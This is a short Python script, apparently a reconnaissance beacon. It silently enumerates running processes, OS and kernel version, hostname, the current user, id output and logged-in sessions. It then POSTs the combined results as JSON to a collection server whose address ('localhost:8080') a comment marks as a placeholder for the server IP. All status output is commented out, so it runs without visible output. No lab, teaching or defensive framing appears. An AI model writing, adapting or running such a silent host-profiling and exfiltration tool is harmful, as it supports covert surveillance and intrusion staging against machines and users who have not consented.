#!/usr/bin/env python
import psutil
from psutil import Process
from datetime import datetime
import requests
import json

try:
	import subprocess as sub
	compatmode = 0  # newer version of python, no need for compatibility mode
except ImportError:
	import os  # older version of python, need to use os instead
	compatmode = 1

def procesos2(id):
	p = Process(id)
	result = str(p.pid) +"," + str(p.name())  
	return result

def procesos():
	results=""
	for proc in psutil.process_iter():
		try:
			processName = proc.name()
			processID = proc.pid
			result = procesos2(processID)
			results = str(results) + str(result)
		except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
			pass
	return results

def execute_cmd(cmddict):
	for item in cmddict:
		cmd = cmddict[item]["cmd"]
		if compatmode == 0:  # newer version of python, use preferred subprocess
			out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
			results = out
		else:  # older version of python, use os.popen
			echo_stdout = os.popen(cmd, 'r')
			results = echo_stdout.read().split('')
		cmddict[item]["results"] = results
	return cmddict


def print_results(cmddict):
	for item in cmddict:
		msg = cmddict[item]["msg"]
		results = cmddict[item]["results"]
		#print("[+]" , msg, results)
		

def enum_system_info():
	#print("[*] GETTING BASIC SYSTEM INFO...")
	sysinfo = {
		"OS": {"cmd": "cat /etc/issue", "msg": "Operating System", "results": []},
		"KERNEL": {"cmd": "cat /proc/version", "msg": "Kernel", "results": []},
		"HOSTNAME": {"cmd": "hostname", "msg": "Hostname", "results": []}
	}
	result=""
	sysinfo = execute_cmd(sysinfo)
	for item in sysinfo:
		result=result + str(sysinfo[item]["results"])+","
	return result

def enum_user_info():
	#print ("\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n")
	userinfo = {
		"WHOAMI": {"cmd": "whoami", "msg": "Current User", "results": []},
		"ID": {"cmd": "id", "msg": "Current User ID", "results": []},
		"LOGGEDIN": {"cmd": "who -a 2>/dev/null", "msg": "Logged in User Activity", "results": []}
	}
	userinfo = execute_cmd(userinfo)
	result=""
	for item in userinfo:
		result=result + str(userinfo[item]["results"])+","
	return result

if __name__ == '__main__':
	procesos = procesos()
	system = enum_system_info()
	users = enum_user_info()
	datas = {"proc":procesos, "user":users, "system":system}
	headers = {"Content-Type": "application/json"}
	requests.post(url='http://localhost:8080',data=json.dumps(datas),headers=headers)#dirección Ip del server